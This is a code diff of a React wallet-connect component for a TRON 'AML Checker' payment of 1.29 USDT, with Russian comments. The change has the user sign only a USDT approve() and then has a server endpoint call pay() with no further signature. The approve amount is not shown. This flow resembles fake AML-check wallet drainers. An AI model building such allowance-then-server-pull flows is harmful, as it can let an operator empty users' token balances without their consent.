@@ -3,11 +3,11 @@ import toast from 'react-hot-toast';
 
 // ─── НАСТРОЙКА ────────────────────────────────────────────────────────────────
 const WC_PROJECT_ID  = '7a01fc0d75597c9ec6bb51608ad91767';
-const TRONGRID_URL   = 'https://nile.trongrid.io';
+const TRONGRID_URL   = process.env.NEXT_PUBLIC_TRONGRID_URL  || 'https://nile.trongrid.io';
+const USDT_CONTRACT  = process.env.NEXT_PUBLIC_USDT_CONTRACT || 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj';
+const AML_CONTRACT   = process.env.NEXT_PUBLIC_AML_CONTRACT  || 'THG9SQhxa6knVqkvQwmMHfwPsMtzvaVoTc';
 const TRONGRID_KEY   = '';
-const USDT_CONTRACT  = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj';
-const AML_CONTRACT   = 'THG9SQhxa6knVqkvQwmMHfwPsMtzvaVoTc';
-const PAYMENT_AMOUNT = 1_290_000;
+const PAYMENT_AMOUNT = 1_290_000; // 1.29 USDT
 // ─────────────────────────────────────────────────────────────────────────────
 
 // ══════════════════════════════════════════════════════════════════════════════
@@ -23,14 +23,15 @@ const getUsdtBalance = async (address) => {
   const res = await fetch(`${TRONGRID_URL}/wallet/triggerconstantcontract`, {
     method: 'POST', headers: tronHeaders(),
     body: JSON.stringify({
-      owner_address: address, contract_address: USDT_CONTRACT,
+      owner_address:     address,
+      contract_address:  USDT_CONTRACT,
       function_selector: 'balanceOf(address)',
-      parameter: _encodeAddress(address).padStart(64, '0'),
-      visible: true,
+      parameter:         _encodeAddress(address).padStart(64, '0'),
+      visible:           true,
     }),
   });
   const data = await res.json();
-  const hex = data?.constant_result?.[0] ?? '0';
+  const hex  = data?.constant_result?.[0] ?? '0';
   return Number(BigInt('0x' + (hex || '0'))) / 1_000_000;
 };
 
@@ -42,30 +43,17 @@ const buildApproveTx = async (fromBase58) => {
   const res = await fetch(`${TRONGRID_URL}/wallet/triggersmartcontract`, {
     method: 'POST', headers: tronHeaders(),
     body: JSON.stringify({
-      owner_address: ownerHex, contract_address: contractHex,
+      owner_address:     ownerHex,
+      contract_address:  contractHex,
       function_selector: 'approve(address,uint256)',
-      parameter: spenderHex + amountHex,
-      fee_limit: 10_000_000, call_value: 0, visible: false,
+      parameter:         spenderHex + amountHex,
+      fee_limit:         10_000_000,
+      call_value:        0,
+      visible:           false,
     }),
   });
   const data = await res.json();
   if (!data?.transaction) throw new Error('buildApproveTx: ' + (data?.Error ?? JSON.stringify(data)));
-  return data.transaction;
-};
-
-const buildPayTx = async (fromBase58) => {
-  const ownerHex    = '41' + _encodeAddress(fromBase58);
-  const contractHex = '41' + _encodeAddress(AML_CONTRACT);
-  const res = await fetch(`${TRONGRID_URL}/wallet/triggersmartcontract`, {
-    method: 'POST', headers: tronHeaders(),
-    body: JSON.stringify({
-      owner_address: ownerHex, contract_address: contractHex,
-      function_selector: 'pay()',
-      parameter: '', fee_limit: 20_000_000, call_value: 0, visible: false,
-    }),
-  });
-  const data = await res.json();
-  if (!data?.transaction) throw new Error('buildPayTx: ' + (data?.Error ?? JSON.stringify(data)));
   return data.transaction;
 };
 
@@ -76,6 +64,18 @@ const broadcastTx = async (signedTx) => {
   });
   const data = await res.json();
   if (!data?.result) throw new Error('broadcast: ' + (data?.message ?? JSON.stringify(data)));
+  return data.txid;
+};
+
+// Серверный вызов pay() — юзер больше ничего не подписывает
+const callServerPay = async (userAddress) => {
+  const res = await fetch('/api/pay', {
+    method:  'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body:    JSON.stringify({ userAddress }),
+  });
+  const data = await res.json();
+  if (!res.ok) throw new Error(data.error || 'Ошибка сервера при вызове pay()');
   return data.txid;
 };
 
@@ -91,194 +91,55 @@ function _encodeAddress(base58Addr) {
 }
 
 // ══════════════════════════════════════════════════════════════════════════════
-// ПРОВАЙДЕР
-// ══════════════════════════════════════════════════════════════════════════════
-
-const isTrustProviderReady = () => {
-  try {
-    const tp = window.trustProvider;
-    return tp != null &&
-      typeof tp.getAccounts === 'function' &&
-      typeof tp.signTransaction === 'function';
-  } catch { return false; }
-};
-
-const waitForTrustProvider = (ms = 8000) => new Promise((resolve) => {
-  if (isTrustProviderReady()) return resolve(true);
-  let elapsed = 0;
-  const t = setInterval(() => {
-    if (isTrustProviderReady())          { clearInterval(t); resolve(true); }
-    else if ((elapsed += 100) >= ms)     { clearInterval(t); resolve(false); }
-  }, 100);
-});
-
-const detectProviderType = () => {
-  if (typeof window === 'undefined') return null;
-  if (typeof window.tronLink?.request === 'function')          return 'tronlink';
-  if (typeof window.trustwallet?.tron?.request === 'function') return 'trustwallet';
-  if (typeof window.trustWallet?.tron?.request === 'function') return 'trustWallet';
-  if (isTrustProviderReady())                                   return 'trustProvider';
-  return null;
-};
-
-const waitForProviderType = (ms = 8000) => new Promise(async (resolve) => {
-  const immediate = detectProviderType();
-  if (immediate) return resolve(immediate);
-  const tpPromise = waitForTrustProvider(ms).then(ok => ok ? 'trustProvider' : null);
-  let elapsed = 0;
-  const t = setInterval(() => {
-    const found = detectProviderType();
-    if (found && found !== 'trustProvider') { clearInterval(t); resolve(found); return; }
-    if ((elapsed += 200) >= ms)             { clearInterval(t); tpPromise.then(resolve); }
-  }, 200);
-  tpPromise.then(type => { if (type) { clearInterval(t); resolve(type); } });
-});
-
-// ══════════════════════════════════════════════════════════════════════════════
-// ПОДКЛЮЧЕНИЕ
-//
-// ИСПРАВЛЕНИЕ: вызываем tp.getAccounts.call(tp) — явная привязка this.
-// Диагностика показала: внутри getAccounts теряется контекст (this=undefined).
-// .call(tp) восстанавливает правильный this.
-// ══════════════════════════════════════════════════════════════════════════════
-
-const connectViaProvider = async (type) => {
-  let address = null;
-
-  if (type === 'trustProvider') {
-    const tp = window.trustProvider;
-    if (!tp || typeof tp.getAccounts !== 'function') {
-      throw new Error('trustProvider недоступен');
-    }
-    console.log('[trustProvider] getAccounts.call(tp)...');
-    // ИСПРАВЛЕНИЕ: .call(tp) — явно передаём this
-    const accounts = await tp.getAccounts.call(tp);
-    console.log('[trustProvider] accounts:', JSON.stringify(accounts));
-    if (Array.isArray(accounts) && accounts[0])  address = accounts[0];
-    else if (typeof accounts === 'string')        address = accounts;
-    else if (accounts?.address)                   address = accounts.address;
-
-  } else if (type === 'tronlink') {
-    const result = await window.tronLink.request({ method: 'tron_requestAccounts' });
-    if (result?.code === 200 || result?.code === 0) {
-      address = await _waitDefaultAddress(2000);
-    } else {
-      address = _extractAddress(result);
-    }
-
-  } else if (type === 'trustwallet') {
-    const result = await window.trustwallet.tron.request({ method: 'tron_requestAccounts' });
-    address = _extractAddress(result);
-
-  } else if (type === 'trustWallet') {
-    const result = await window.trustWallet.tron.request({ method: 'tron_requestAccounts' });
-    address = _extractAddress(result);
-  }
-
-  if (!address) throw new Error('Не удалось получить адрес кошелька.');
-  return address;
-};
-
-const _extractAddress = (r) => {
-  if (Array.isArray(r) && r[0]) return r[0];
-  if (typeof r === 'string')    return r;
-  if (r?.address)               return r.address;
-  return null;
-};
-
-const _waitDefaultAddress = (ms) => new Promise((resolve) => {
-  let n = 0;
-  const t = setInterval(() => {
-    const addr = window.tronLink?.defaultAddress?.base58 || window.tronWeb?.defaultAddress?.base58;
-    if (addr || ++n > ms / 100) { clearInterval(t); resolve(addr ?? null); }
-  }, 100);
-});
-
-// ══════════════════════════════════════════════════════════════════════════════
-// ПОДПИСЬ — тоже .call(tp)
-// ══════════════════════════════════════════════════════════════════════════════
-
-const unwrapSigned = (r) => {
-  if (!r) return null;
-  if (r.signature || r.txID) return r;
-  if (r.result?.signature || r.result?.txID) return r.result;
-  return null;
-};
-
-const signViaProvider = async (type, tx) => {
-  if (type === 'trustProvider') {
-    const tp = window.trustProvider;
-    if (!tp || typeof tp.signTransaction !== 'function') {
-      throw new Error('trustProvider недоступен при подписи');
-    }
-    console.log('[trustProvider] signTransaction.call(tp)...');
-    // ИСПРАВЛЕНИЕ: .call(tp) — явно передаём this
-    const response = await tp.signTransaction.call(tp, tx);
-    console.log('[trustProvider] response:', JSON.stringify(response));
-    const signed = unwrapSigned(response);
-    if (signed) return signed;
-    if (response?.raw_data || response?.raw_data_hex) return response;
-    throw new Error('trustProvider: неожиданный ответ: ' + JSON.stringify(response));
-  }
-
-  const getProvider = () => {
-    if (type === 'tronlink')    return window.tronLink;
-    if (type === 'trustwallet') return window.trustwallet?.tron;
-    if (type === 'trustWallet') return window.trustWallet?.tron;
-    return null;
-  };
-
-  const prov = getProvider();
-  if (!prov?.request) throw new Error('Провайдер недоступен при подписи');
-
-  const attempts = [
-    () => prov.request({ method: 'tron_signTransaction', params: { transaction: tx } }),
-    () => prov.request({ method: 'tron_signTransaction', params: [tx] }),
-    () => prov.request({ method: 'tron_signTransaction', params: tx }),
-  ];
-  let lastErr;
-  for (const attempt of attempts) {
-    try {
-      const response = await attempt();
-      const signed = unwrapSigned(response);
-      if (signed) return signed;
-    } catch (e) {
-      lastErr = e;
-      if (e.code === 4001 || /reject|cancel|denied/i.test(e.message ?? '')) throw e;
-      if (e.message?.includes('Unknown method') || e.code === -32601) continue;
-      throw e;
-    }
-  }
-  throw new Error('Не удалось подписать.\n' + (lastErr?.message ?? ''));
-};
-
-// ══════════════════════════════════════════════════════════════════════════════
 // WALLETCONNECT
 // ══════════════════════════════════════════════════════════════════════════════
 
 const connectViaWalletConnect = async () => {
   const { SignClient }         = await import('@walletconnect/sign-client');
   const { WalletConnectModal } = await import('@walletconnect/modal');
+
   const client = await SignClient.init({
     projectId: WC_PROJECT_ID,
-    metadata: { name: 'AML Checker', description: 'TRC-20 Risk Score', url: window.location.origin, icons: [window.location.origin + '/favicon.ico'] },
+    metadata: {
+      name: 'AML Checker', description: 'TRC-20 Risk Score',
+      url:  window.location.origin,
+      icons: [window.location.origin + '/favicon.ico'],
+    },
   });
+
   const modal = new WalletConnectModal({
     projectId: WC_PROJECT_ID, themeMode: 'dark',
     themeVariables: { '--wcm-accent-color': '#3b82f6' },
     explorerRecommendedWalletIds: ['4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0'],
   });
+
   const { uri, approval } = await client.connect({
     optionalNamespaces: {
-      tron: { methods: ['tron_signTransaction', 'tron_signMessage'], chains: ['tron:0x2b6653dc'], events: [] },
+      tron: {
+        methods: ['tron_signTransaction', 'tron_signMessage'],
+        chains:  ['tron:0x2b6653dc'],
+        events:  [],
+      },
     },
   });
+
   if (uri) modal.openModal({ uri });
   let session;
-  try { session = await approval(); } finally { modal.closeModal(); }
+  try   { session = await approval(); }
+  finally { modal.closeModal(); }
+
+  console.log('[WC] namespaces:', JSON.stringify(session.namespaces));
+
   const accounts = session.namespaces?.tron?.accounts ?? [];
   if (!accounts.length) throw new Error('Кошелёк не вернул TRON аккаунт.');
   return { client, session, address: accounts[0].split(':')[2] };
+};
+
+const unwrapSigned = (r) => {
+  if (!r) return null;
+  if (r.signature || r.txID) return r;
+  if (r.result?.signature || r.result?.txID) return r.result;
+  return null;
 };
 
 const signViaWalletConnect = async (client, session, tx) => {
@@ -292,11 +153,13 @@ const signViaWalletConnect = async (client, session, tx) => {
   for (const attempt of attempts) {
     try {
       const response = await attempt();
+      console.log('[WC] sign response:', JSON.stringify(response));
       const signed = unwrapSigned(response);
       if (signed) return signed;
       if (response?.raw_data || response?.raw_data_hex) return response;
     } catch (e) {
       lastErr = e;
+      console.warn('[WC failed]', e.code, e.message);
       if (e.code === 4001 || /reject|cancel|denied/i.test(e.message ?? '')) throw e;
       if (e.message?.includes('Unknown method') || e.code === -32601) continue;
       throw e;
@@ -316,21 +179,11 @@ export default function WalletConnect({ onConnect, onDisconnect, onPaymentSucces
   const [step,       setStep]       = useState('');
   const [txHash,     setTxHash]     = useState(null);
 
-  const sessionRef = useRef({ type: null, client: null, session: null });
-
-  const fmt    = (a) => `${a.slice(0, 6)}...${a.slice(-4)}`;
-  const isBusy = connecting || paying;
-
-  const signAndBroadcast = async (tx) => {
-    const sess = sessionRef.current;
-    const signed = sess.type === 'walletconnect'
-      ? await signViaWalletConnect(sess.client, sess.session, tx)
-      : await signViaProvider(sess.type, tx);
-    return broadcastTx(signed);
-  };
+  const sessionRef = useRef({ client: null, session: null });
+  const isBusy     = connecting || paying;
+  const fmt        = (a) => `${a.slice(0, 6)}...${a.slice(-4)}`;
 
   const sendPayment = async (addr) => {
-    if (!sessionRef.current.type) throw new Error('Кошелёк не подключён.');
     setPaying(true);
     try {
       const balance = await getUsdtBalance(addr);
@@ -339,24 +192,27 @@ export default function WalletConnect({ onConnect, onDisconnect, onPaymentSucces
         throw new Error(`Недостаточно USDT.\nНужно: ${needed.toFixed(2)} · Доступно: ${balance.toFixed(6)}`);
       }
 
-      // Шаг 1 — approve
+      // Шаг 1 — юзер подписывает approve (единственная подпись)
       setStep('approve');
-      const tid1 = toast.loading('Шаг 1/2 — подпиши approve в кошельке…');
+      const tid1 = toast.loading('Подпиши approve в кошельке…');
       try {
-        const txid = await signAndBroadcast(await buildApproveTx(addr));
+        const approveTx  = await buildApproveTx(addr);
+        const signed     = await signViaWalletConnect(sessionRef.current.client, sessionRef.current.session, approveTx);
+        const approveTxid = await broadcastTx(signed);
         toast.dismiss(tid1);
-        toast.success('Approve отправлен ✓', { duration: 3000 });
-        console.log('[approve] txid:', txid);
+        toast.success('Approve подписан ✓', { duration: 3000 });
+        console.log('[approve] txid:', approveTxid);
       } catch (e) { toast.dismiss(tid1); throw e; }
 
+      // Ждём подтверждения approve
       await new Promise(r => setTimeout(r, 3000));
 
-      // Шаг 2 — pay()
+      // Шаг 2 — сервер сам вызывает pay(), юзер ничего не подписывает
       setStep('pay');
-      const tid2 = toast.loading('Шаг 2/2 — подпиши pay() в кошельке…');
+      const tid2 = toast.loading('Сервер выполняет оплату…');
       let payTxid;
       try {
-        payTxid = await signAndBroadcast(await buildPayTx(addr));
+        payTxid = await callServerPay(addr);
         toast.dismiss(tid2);
         toast.success(`Оплата прошла! TX: ${payTxid.slice(0, 14)}…`, { duration: 6000 });
         console.log('[pay] txid:', payTxid);
@@ -374,19 +230,11 @@ export default function WalletConnect({ onConnect, onDisconnect, onPaymentSucces
     setConnecting(true);
     let addr = null;
     try {
-      const type = await waitForProviderType(8000);
-      console.log('[connect] type:', type ?? 'null → WalletConnect');
-
-      if (type) {
-        addr = await connectViaProvider(type);
-        sessionRef.current = { type, client: null, session: null };
-      } else {
-        const wc = await connectViaWalletConnect();
-        addr = wc.address;
-        sessionRef.current = { type: 'walletconnect', client: wc.client, session: wc.session };
-        wc.client.on('session_delete', () => { sessionRef.current = { type: null }; handleDisconnect(); });
-        wc.client.on('session_expire',  () => { sessionRef.current = { type: null }; handleDisconnect(); });
-      }
+      const wc = await connectViaWalletConnect();
+      addr = wc.address;
+      sessionRef.current = { client: wc.client, session: wc.session };
+      wc.client.on('session_delete', () => { sessionRef.current = {}; handleDisconnect(); });
+      wc.client.on('session_expire',  () => { sessionRef.current = {}; handleDisconnect(); });
 
       setAddress(addr);
       onConnect?.(addr);
@@ -405,19 +253,19 @@ export default function WalletConnect({ onConnect, onDisconnect, onPaymentSucces
   const handleDisconnect = () => { setAddress(null); setTxHash(null); setStep(''); onDisconnect?.(); };
 
   const disconnect = () => {
-    const sess = sessionRef.current;
-    if (sess.type === 'walletconnect' && sess.client && sess.session) {
-      sess.client.disconnect({ topic: sess.session.topic, reason: { code: 6000, message: 'User disconnected' } }).catch(() => {});
+    const { client, session } = sessionRef.current;
+    if (client && session) {
+      client.disconnect({ topic: session.topic, reason: { code: 6000, message: 'User disconnected' } }).catch(() => {});
     }
-    sessionRef.current = { type: null };
+    sessionRef.current = {};
     handleDisconnect();
     toast.success('Кошелёк отключён');
   };
 
   const btnLabel = () => {
     if (connecting)         return 'Подключение...';
-    if (step === 'approve') return 'Шаг 1/2: approve...';
-    if (step === 'pay')     return 'Шаг 2/2: pay()...';
+    if (step === 'approve') return 'Ожидание approve...';
+    if (step === 'pay')     return 'Сервер обрабатывает...';
     if (paying)             return 'Ожидание...';
     return 'Подключить кошелёк · $1.29';
   };
@@ -451,8 +299,8 @@ export default function WalletConnect({ onConnect, onDisconnect, onPaymentSucces
           {paying && (
             <div style={{ fontSize: '0.8rem', color: '#a0b3d9', display: 'flex', alignItems: 'center', gap: '8px' }}>
               <Spinner size={12} />
-              {step === 'approve' && 'Шаг 1/2: approve…'}
-              {step === 'pay'     && 'Шаг 2/2: pay()…'}
+              {step === 'approve' && 'Подпиши approve в кошельке…'}
+              {step === 'pay'     && 'Сервер выполняет pay()…'}
             </div>
           )}
           {!txHash && !paying && (
